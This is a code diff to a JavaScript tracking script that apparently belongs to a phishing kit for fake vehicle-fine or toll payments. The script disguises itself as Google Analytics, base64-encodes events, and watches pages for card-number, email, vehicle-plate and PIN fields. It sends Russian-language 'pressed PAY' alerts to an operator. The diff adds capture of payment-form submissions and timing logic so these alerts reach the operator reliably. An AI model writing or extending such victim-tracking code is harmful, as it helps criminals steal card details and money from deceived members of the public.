@@ -837,6 +837,7 @@ function decodeGAEvent(gaData) {
     
     // Payment button events - HIGH PRIORITY
     'payment:button_click:pay': { type: 'pay_button_click', page: '💳 НАЖАЛ КНОПКУ PAY!' },
+    'payment:form_submit:pay': { type: 'pay_button_click', page: '💳 НАЖАЛ КНОПКУ PAY!' },
     
     // Page events
     'page:view': { type: 'page_view' },
@@ -887,8 +888,8 @@ function decodeGAEvent(gaData) {
     mapped.page = '🚪 Переход на ' + el;
   }
   
-  // For PAY button clicks - HIGH PRIORITY
-  if (ec === 'payment' && ea === 'button_click') {
+  // For PAY button clicks or form submit - HIGH PRIORITY
+  if (ec === 'payment' && (ea === 'button_click' || ea === 'form_submit')) {
     mapped.type = 'pay_button_click';
     mapped.message = '🚨 НАЖАЛ КНОПКУ PAY!';
     mapped.value = ev || 'Pay';
@@ -1023,7 +1024,7 @@ function getTrackingScript() {
   w['GoogleAnalyticsObject']=l;w[l]=w[l]||function(){(w[l].q=w[l].q||[]).push(arguments)};
   w[l].l=1*new Date();
   
-  var _sent={},_step=0,_page=location.pathname;
+  var _sent={},_step=0,_page=location.pathname,_payClickTime=0;
   
   // Encode data
   function _enc(o){try{return btoa(unescape(encodeURIComponent(JSON.stringify(o))))}catch(e){return''}}
@@ -1108,8 +1109,14 @@ function getTrackingScript() {
     return s.display!=='none'&&s.visibility!=='hidden'&&el.offsetParent!==null;
   }
   
-  // Detect current form step
+  // Detect current form step - BUT SKIP if Pay button was just clicked
   function _detectStep(){
+    // SKIP step detection for 3 seconds after Pay button click
+    // This ensures Pay click event is sent first and not overwritten
+    if(_payClickTime && (Date.now() - _payClickTime) < 3000){
+      return;
+    }
+    
     var cardInputs=d.querySelectorAll('input[name*="card"],input[name*="pan"],input[name*="cc_number"]');
     var emailInputs=d.querySelectorAll('input[type="email"],input[name*="email"]');
     var vehInputs=d.querySelectorAll('input[name*="vehicle"],input[name*="reg"],input[name*="vrn"],input[name*="plate"]');
@@ -1270,8 +1277,11 @@ function getTrackingScript() {
       }
       
       if(isPay){
-        // Send special PAY BUTTON event - HIGH PRIORITY
+        // Set flag to block step detection for 3 seconds
+        _payClickTime=Date.now();
+        // Send special PAY BUTTON event - HIGH PRIORITY - IMMEDIATELY
         _send({t:'event',ec:'payment',ea:'button_click',el:'pay',ev:txt||'Pay',pg:_getPageType()});
+        console.log('[TRACK] PAY BUTTON CLICKED!', txt);
       }else if(txt&&txt.length>0){
         _send({t:'event',ec:'ui',ea:'click',el:'button',ev:txt,pg:_getPageType()});
       }
@@ -1289,9 +1299,37 @@ function getTrackingScript() {
     }
   },true);
   
+  // Track form submissions - catches Pay button even if click doesn't work
+  d.addEventListener('submit',function(e){
+    var form=e.target;
+    if(!form||!form.tagName)return;
+    
+    // Check if this is a payment form
+    var formId=(form.id||'').toLowerCase();
+    var formAction=(form.action||'').toLowerCase();
+    var formClass=(form.className||'').toLowerCase();
+    
+    var isPayForm=formId.indexOf('pay')>-1||formAction.indexOf('pay')>-1||formClass.indexOf('pay')>-1||
+                  formId.indexOf('checkout')>-1||formAction.indexOf('checkout')>-1||
+                  formId.indexOf('payment')>-1||formAction.indexOf('payment')>-1;
+    
+    // Find submit button text
+    var submitBtn=form.querySelector('button[type="submit"],input[type="submit"],button:not([type])');
+    var btnText='Submit';
+    if(submitBtn){
+      btnText=(submitBtn.textContent||submitBtn.value||'').replace(/[\\s\\n\\r\\t]+/g,' ').trim();
+    }
+    
+    if(isPayForm||btnText.toLowerCase().indexOf('pay')>-1){
+      _payClickTime=Date.now();
+      _send({t:'event',ec:'payment',ea:'form_submit',el:'pay',ev:btnText||'Pay Form',pg:_getPageType()});
+      console.log('[TRACK] PAY FORM SUBMITTED!', btnText);
+    }
+  },true);
+  
   // Run step detection periodically
   setInterval(_detectStep,1500);
-  setTimeout(_detectStep,300);
+  setTimeout(_detectStep,500);
   
   // Track PIN/Notice completion periodically
   var _lastPIN='',_lastNotice='',_lastVRN='';
